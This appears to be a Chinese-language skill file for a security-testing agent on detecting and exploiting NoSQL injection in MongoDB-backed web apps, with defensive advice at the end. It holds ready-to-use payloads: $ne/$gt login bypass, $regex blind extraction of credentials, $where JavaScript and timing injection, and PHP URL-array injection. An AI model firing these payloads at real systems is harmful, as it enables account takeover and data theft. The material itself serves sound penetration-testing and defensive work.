---
name: web-nosql-injection-001
description: "NoSQL 注入检测与利用技术，用于发现和利用 MongoDB、CouchDB、Cassandra 等 NoSQL 数据库的注入漏洞 适用于: 应用使用 MongoDB 等 NoSQL 数据库存储数据; API 端点使用 JSON 格式查询参数; Express.js + Mongoose 或类似的 Node.js 应用栈"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - nosql
  - nosql-injection
  - mongodb
  - mongodb-injection
  - couchdb
  - express
  - mongoose
  - bson
  - injection
  - authentication-bypass
  category: web
  risk-level: critical
  confidence: 0.87
---
# NoSQL Injection Detection & Exploitation

NoSQL 注入是针对 NoSQL 数据库（如 MongoDB、CouchDB、Cassandra）的攻击技术。与传统 SQL 注入不同，NoSQL 注入利用 JSON 查询语法、操作符注入和类型篡改等方式绕过认证或提取数据。Node.js + MongoDB 架构是最常见的攻击面，但在 PHP + MongoDB、Python + MongoDB 中也同样存在。

## 何时使用

### 触发场景

- 应用使用 MongoDB 等 NoSQL 数据库存储数据
- API 端点使用 JSON 格式查询参数
- Express.js + Mongoose 或类似的 Node.js 应用栈
- 使用 MongoDB 的 PHP 应用（Laravel MongoDB、CodeIgniter MongoDB）
- Python Flask/Django 结合 MongoDB
- REST API 端点支持 $where、$regex 等 MongoDB 操作符
- 登录/搜索端点对特殊字符（'、"、$）无适当过滤

### 关键词

`nosql`, `mongodb`, `couchdb`, `nosql injection`, `mongodb injection`, `$ne`, `$gt`, `$regex`, `$where`, `bson`, `json injection`, `mongoose`, `express injection`, `authentication bypass nosql`, `nosql盲注`

### 识别指标

- URL 编码 JSON 作为查询参数
- Content-Type: application/json 的 POST 登录请求
- 使用 $ 开头的操作符在请求中出现
- 响应状态码在修改 JSON 类型后发生变化（如 true/false/null 替换字符串）
- 应用栈使用 Node.js + Express + MongoDB
- REST API 端点名包含 /api/search、/api/find、/api/query

### 别名

`NoSQL 注入`, `MongoDB 注入`, `JSON 注入`, `BSON 注入`, `操作符注入`, `非关系型数据库注入`

## 操作检查清单

1. 识别 NoSQL 数据库类型（MongoDB、CouchDB、Cassandra、DynamoDB）
2. 测试基础 NoSQL 注入：修改 Content-Type 为 application/json 发送 JSON payload
3. 测试认证绕过：{"username": "admin", "password": {"$ne": ""}}
4. 测试 $gt 操作符：{"$gt": ""} 或 {"$gt": "!"} 绕过字符串匹配
5. 测试 $regex 操作符：{"username": {"$regex": ".*"}} 盲注提取数据
6. 测试 $in 操作符：{"$in": ["admin", "root", "user"]}
7. 测试 $nin 操作符：{"$nin": ["invalid"]}
8. 测试 $where 注入：{"$where": "this.password.length > 0"} JavaScript 注入
9. 测试布尔盲注：通过 True/False 响应差异提取数据
10. 测试类型注入：将字符串值改为 true/1/null 观察响应变化
11. 测试 HTTP 参数注入（PHP MongoDB）：username[$ne]=
12. 测试 URL 编码 NoSQL 注入：username[$regex]=^a
13. 测试 MongoDB mapReduce 注入
14. 验证 $where 能否执行任意 JavaScript

## 技术手段

- 认证绕过：{$ne: ""}（不等于空）、{$gt: ""}（大于空字符串）
- 操作符注入：$ne、$gt、$regex、$where、$in、$nin、$exists、$type
- 布尔盲注：利用 $regex 测试字符逐位爆破
- 时间盲注：$where 中使用 sleep 延时
- JavaScript 注入：$where 中的 JS 代码可访问 Node.js 全局对象
- 类型注入：将 password="secret" 改为 password=true（类型宽松匹配可绕过）
- JSON 边界绕过：利用注释、编码差异、双重解析
- HTTP 参数污染：PHP MongoDB 驱动支持 URL 参数注入 username[$gt]=
- MapReduce 注入：利用 map/reduce 函数中的 JavaScript 注入
- Lookup 聚合注入：在聚合管道的 $lookup 中注入

## 实战经验

### 症状

- JSON API 中用户名密码使用 JSON 格式提交
- 修改 password 为 JSON 对象后登录成功
- 在 JSON 中使用 $ne/$gt 操作符导致查询行为异常
- 返回结果受 $regex 操作符影响
- 错误消息暴露了 MongoDB 查询信息
- URL 参数使用 PHP 数组语法（username[]=admin）

### 根因分析

- 服务端直接将用户输入的 JSON 反序列化为 MongoDB 查询对象（无参数化查询）
- 未对 $ 前缀的操作符进行过滤或转义
- MongoDB 查询的灵活性允许攻击者注入操作符
- PHP MongoDB 驱动将 URL 参数解析为嵌套对象
- 应用使用 eval 或 JavaScript 表达式直接构造查询
- ORM 层未正确转义用户输入（如 Mongoose 的 .where() 方法误用）
- 使用 mongo shell 的 $where 执行 JavaScript 代码

### 实战观察

- Node.js + MongoDB 的 NoSQL 注入占所有案例的 70% 以上
- Express.js 的 body-parser 默认将 JSON 解析为对象，传输查询操作符
- PHP MongoDB 驱动支持 URL 参数注入（username[$ne]=1）
- $regex 盲注每字符需要 60-80 次请求（ASCII 大小写 + 数字）
- $where 注入功能最强大（可执行 JS）但 MongoDB 4.2+ 默认限制使用
- MongoDB Atlas 默认启用 $where 限制
- NoSQL 注入在 Burp Suite 中有专门的扩展（NoSQLMap、NoSQLi）
- Python MongoDB（PyMongo、MongoEngine）也可能存在注入问题

### 常见错误

- 只测试了 SQL 注入，忽略了 NoSQL 注入的可能
- JSON API 未测试 Content-Type 变更
- 忽略 $regex 操作符在 NoSQL 盲注中的威力
- 未检查布尔盲注的响应差异（状态码、内容长度、错误消息）
- 假设 MongoDB 是"安全的"因为不使用 SQL 语法

### 补充说明

- NoSQL 注入的危害通常低于 SQL 注入（难以实现文件读取），但认证绕过极为常见
- MongoDB 的 $regex 操作符支持正则表达式盲注，比 SQL 的 LIKE 盲注更灵活
- 在 MongoDB 4.2+ 中 $where 默认禁用，但在旧版本和特定配置中仍可用
- NoSQL 注入的成功率高于 SQL 注入，因为开发者对 NoSQL 安全的意识较弱

## 示例

### MongoDB 认证绕过

利用 $ne 操作符绕过登录认证

```
正常请求:
POST /login HTTP/1.1
Content-Type: application/json
{"username": "admin", "password": "secret123"}

NoSQL 注入请求:
POST /login HTTP/1.1
Content-Type: application/json
{"username": "admin", "password": {"$ne": ""}}

更广泛的绕过:
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "root", "superuser"]}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

原理: $ne = "not equal"，任何非空密码都匹配
     服务端将 JSON 直接 MongoDB 查询对象
     db.users.findOne({username: "admin", password: {$ne: ""}})
```

### Content-Type 切换注入

将 Content-Type 从 x-www-form-urlencoded 改为 application/json

```
原始请求:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=admin&password=secret

修改为:
POST /login HTTP/1.1
Content-Type: application/json
{"username": "admin", "password": {"$gt": ""}}

原理: Express body-parser 根据 Content-Type 解析请求体
     application/json → JSON.parse → JavaScript 对象
     对象中的 $ne 被解释为 MongoDB 操作符
```

### $regex 布尔盲注

使用 $regex 操作符逐字符提取数据

```
探测用户名首字符:
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
→ 若返回成功登录，则用户名以 'a' 开头

逐字符爆破:
{"$regex": "^a.*"}  → True/False
{"$regex": "^ad.*"} → True/False
{"$regex": "^adm.*"} → True/False
{"$regex": "^admi.*"} → True/False
{"$regex": "^admin.*"} → True

利用 $nin 进行反向匹配:
{"username": {"$regex": ".*"}, "password": {"$nin": ["invalid"]}}

提取密码长度:
{"username": "admin", "password": {"$regex": ".{8}"}}
→ 若返回成功，密码长度 >= 8
```

### $where JavaScript 注入

利用 $where 操作符执行 JavaScript 代码

```
基础测试:
{"username": "admin", "password": {"$where": "this.password.length > 0"}}

延时注入（检测数据库响应延迟）:
{"$where": "sleep(5000) || true"}
（MongoDB 4.2+ 默认禁用）

时间盲注（利用 JS 计算耗时）:
{"$where": "function(){var d=new Date();while(new Date()-d<5000);return true;}()"}

数据提取（利用条件判断）:
{"$where": "this.password.charCodeAt(0) == 97 && sleep(100)"}

注意: $where 在 MongoDB 4.2+ 中默认禁用
     启用时对性能影响大，开发环境常见而生产环境较少
     在高版本的 Node.js MongoDB 驱动中已弃用
```

### PHP MongoDB URL 参数注入

PHP MongoDB 驱动的特殊注入方式

```
PHP MongoDB 驱动会将 URL 参数解析为嵌套文档

正常请求:
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=admin&password=secret

注入请求:
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username[$ne]=&password[$ne]=

还可以使用:
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$nin][]=guest&password[$ne]=

原理: PHP 将 username[$ne] 解析为数组 ["username" => ["$ne" => ""]]
     MongoDB 驱动将此数组解释为 MongoDB 查询操作符
```

## 验证标准

### 验证指标

- 使用 JSON 格式发送 {$ne: ""} 绕过密码验证
- 使用 {$gt: ""} 成功登录（空字符比较）
- $regex 表达式影响查询返回结果
- 布尔盲注中 True/False 响应存在可观测差异
- Content-Type 切换后注入成功
- PHP URL 参数注入成功

### 成功标志

- 未提供有效密码即成功登录用户账户
- 以管理员身份登录系统
- 通过 $regex 盲注提取出敏感数据（用户名、密码）
- 确认 NoSQL 数据库类型和版本
- $where 注入成功执行 JavaScript

### 误报标志

- 响应状态码 200 但实际未登录成功（仅返回页面本身）
- JSON 参数被服务端转义或过滤（操作符失效）
- $regex 注入仅影响前端搜索而非后端查询
- $where 被 MongoDB 4.2+ 安全策略阻止

## 防御建议

### 推荐做法

- 使用参数化查询或 ORM 的安全方法（禁止 JSON 直接构造查询对象）
- 过滤用户输入中的 $ 操作符（mongo-escape、mongo-sanitize）
- 对 JSON 输入进行类型检查，禁止将字符串替换为对象/数组
- 使用 Mongoose 的 Schema 类型约束限制查询操作符
- 避免使用 $where 操作符，或在生产环境禁用
- 验证 Content-Type 确保与预期一致
- 实施输入验证白名单

### 缓解措施

- 升级 MongoDB 到 4.2+ 并禁用 $where
- 使用身份验证和授权限制数据库操作
- 实施最小数据库用户权限
- 使用 WAF 规则检测 NoSQL 注入 payload
- 定期安全审计查询逻辑
- 对错误消息进行统一处理防止泄露查询结构

## 参考链接

- https://portswigger.net/web-security/nosql-injection
- https://book.hacktricks.xyz/pentesting-web/nosql-injection
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- https://github.com/codingo/NoSQLMap
- https://www.mongodb.com/docs/manual/reference/operator/query/
